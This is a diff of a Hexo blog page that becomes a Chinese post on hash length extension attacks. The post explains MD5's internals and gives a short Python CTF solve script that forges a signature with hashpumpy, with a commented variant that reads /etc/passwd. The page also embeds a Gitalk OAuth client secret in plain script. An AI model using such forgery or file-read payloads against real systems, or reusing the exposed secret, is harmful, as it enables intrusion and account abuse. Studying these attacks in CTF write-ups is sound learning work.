@@ -3,7 +3,7 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
   
-  <title>Polgry&#39;s Blog</title>
+  <title>哈希长度扩展 - Polgry&#39;s Blog</title>
   <meta charset="UTF-8">
   <meta name="description" content="Polgry&#39;s blog3">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -11,16 +11,17 @@
   
 
   <link rel="shortcut icon" href="/favicon.ico" type="image/png">
-  <meta name="description" content="Polgry&apos;s blog3">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Polgry&#39;s Blog">
-<meta property="og:url" content="https://polgry.github.io/index.html">
+  <meta name="description" content="哈希长度扩展攻击学习：之前做题遇到过好好几次hash长度扩展攻击，每次遇到就扔给队友…这次正好借助Crypto的机会，补上。先简单一句话讲一下哈希长度扩展攻击能干什么： 已知一个哈希值hash(key|s|padding)，在不知道key的情况下,可以构造出其他的hash(key|s|padding|else)  0X1摘要算法实现过程以MD5为例，理解一下，Hash算法过程 以这个流程图为例MD">
+<meta property="og:type" content="article">
+<meta property="og:title" content="哈希长度扩展">
+<meta property="og:url" content="https://polgry.github.io/2019/09/08/2/index.html">
 <meta property="og:site_name" content="Polgry&#39;s Blog">
-<meta property="og:description" content="Polgry&apos;s blog3">
+<meta property="og:description" content="哈希长度扩展攻击学习：之前做题遇到过好好几次hash长度扩展攻击，每次遇到就扔给队友…这次正好借助Crypto的机会，补上。先简单一句话讲一下哈希长度扩展攻击能干什么： 已知一个哈希值hash(key|s|padding)，在不知道key的情况下,可以构造出其他的hash(key|s|padding|else)  0X1摘要算法实现过程以MD5为例，理解一下，Hash算法过程 以这个流程图为例MD">
 <meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-09-08T12:48:36.391Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Polgry&#39;s Blog">
-<meta name="twitter:description" content="Polgry&apos;s blog3">
+<meta name="twitter:title" content="哈希长度扩展">
+<meta name="twitter:description" content="哈希长度扩展攻击学习：之前做题遇到过好好几次hash长度扩展攻击，每次遇到就扔给队友…这次正好借助Crypto的机会，补上。先简单一句话讲一下哈希长度扩展攻击能干什么： 已知一个哈希值hash(key|s|padding)，在不知道key的情况下,可以构造出其他的hash(key|s|padding|else)  0X1摘要算法实现过程以MD5为例，理解一下，Hash算法过程 以这个流程图为例MD">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
    
@@ -28,7 +29,7 @@
   
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1568025495493">
+  <link rel="stylesheet" href="/css/style.css?v=1568025495449">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -118,27 +119,22 @@
   </div>
   <div id="nexmoe-content">
     <div class="nexmoe-primary">
-        <section class="nexmoe-posts" id="brand-waterfall">
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+        <img src="http://imgsrc.baidu.com/forum/pic/item/268709087bf40ad1beb3fbb65e2c11dfa8ecce08.jpg">
+        
+        <h1>哈希长度扩展</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2019年09月08日</a>
+    <a><i class="nexmoefont icon-areachart"></i>1.3k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 6 分钟</a>
     
-    <div class="nexmoe-post">
-        <a href="/2019/09/08/2/">
-            <div class="nexmoe-post-cover mdui-ripple"> 
-                
-                <img src="http://imgsrc.baidu.com/forum/pic/item/268709087bf40ad1beb3fbb65e2c11dfa8ecce08.jpg" alt="哈希长度扩展">
-                
-                <h1>哈希长度扩展</h1>
-            </div>
-        </a>
-        <div class="nexmoe-post-meta">
-            <a><i class="nexmoefont icon-calendar-fill"></i>2019年09月08日</a>
-            <a><i class="nexmoefont icon-areachart"></i>1.3k 字</a>
-            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 6 分钟</a>
-            
-            
-        </div>
-        <article>
-            
-            <h1 id="哈希长度扩展攻击学习："><a href="#哈希长度扩展攻击学习：" class="headerlink" title="哈希长度扩展攻击学习："></a>哈希长度扩展攻击学习：</h1><p>之前做题遇到过好好几次hash长度扩展攻击，每次遇到就扔给队友…这次正好借助Crypto的机会，补上。<br>先简单一句话讲一下哈希长度扩展攻击能干什么：</p>
+    
+  </div>
+  <article>
+    <h1 id="哈希长度扩展攻击学习："><a href="#哈希长度扩展攻击学习：" class="headerlink" title="哈希长度扩展攻击学习："></a>哈希长度扩展攻击学习：</h1><p>之前做题遇到过好好几次hash长度扩展攻击，每次遇到就扔给队友…这次正好借助Crypto的机会，补上。<br>先简单一句话讲一下哈希长度扩展攻击能干什么：</p>
 <p>已知一个哈希值hash(key|s|padding)，在不知道key的情况下,可以构造出其他的hash(key|s|padding|else)</p>
 <hr>
 <h3 id="0X1摘要算法实现过程"><a href="#0X1摘要算法实现过程" class="headerlink" title="0X1摘要算法实现过程"></a><strong>0X1</strong>摘要算法实现过程</h3><p>以MD5为例，理解一下，Hash算法过程</p>
@@ -162,36 +158,37 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import hashpumpy</span><br><span class="line">import requests</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line">url = &apos;flag.txt&apos;</span><br><span class="line"># url = &apos;local-file:/etc/passwd&apos;</span><br><span class="line">r = requests.get(&apos;http://web68.buuoj.cn/geneSign&apos;, params=&#123;&apos;param&apos;: url&#125;)</span><br><span class="line">sign = r.text</span><br><span class="line">hash_sign = hashpumpy.hashpump(sign, url + &apos;scan&apos;, &apos;read&apos;, 16)</span><br><span class="line"></span><br><span class="line">r = requests.get(&apos;http://web68.buuoj.cn/De1ta&apos;, params=&#123;&apos;param&apos;: url&#125;, cookies=&#123;</span><br><span class="line">    &apos;sign&apos;: hash_sign[0],</span><br><span class="line">    &apos;action&apos;: urllib.parse.quote(hash_sign[1][len(url):])</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
 
 
-            
-        </article>
-    </div>
+  </article>
+  
     
-    <div class="nexmoe-post">
-        <a href="/2019/09/08/qweqwe/">
-            <div class="nexmoe-post-cover mdui-ripple"> 
-                
-                <img src="http://imgsrc.baidu.com/forum/pic/item/268709087bf40ad1beb3fbb65e2c11dfa8ecce08.jpg" alt="第一篇log">
-                
-                <h1>第一篇log</h1>
-            </div>
-        </a>
-        <div class="nexmoe-post-meta">
-            <a><i class="nexmoefont icon-calendar-fill"></i>2019年09月08日</a>
-            <a><i class="nexmoefont icon-areachart"></i>32 字</a>
-            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
-            
-            
-        </div>
-        <article>
-            
-            <p>今天终于把blog在本地搭好了，希望以后多学东西，多写东西，然后有内容输出吧。</p>
+<div class="nexmoe-post-copyright">
+<i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+<strong>Author：</strong>Polgry<br>
+<strong>Link：</strong><a href="https://polgry.github.io/2019/09/08/2/" title="https://polgry.github.io/2019/09/08/2/" target="_blank" rel="noopener">https://polgry.github.io/2019/09/08/2/</a><br>
 
-            
-        </article>
-    </div>
-    
+  <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+
+</div>
+
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
 </section>
-
+</div>
     </div>
   </div>
   <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
@@ -207,7 +204,7 @@
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/js/app.js?v=1568025495496"></script>
+<script src="/js/app.js?v=1568025495456"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
 
 
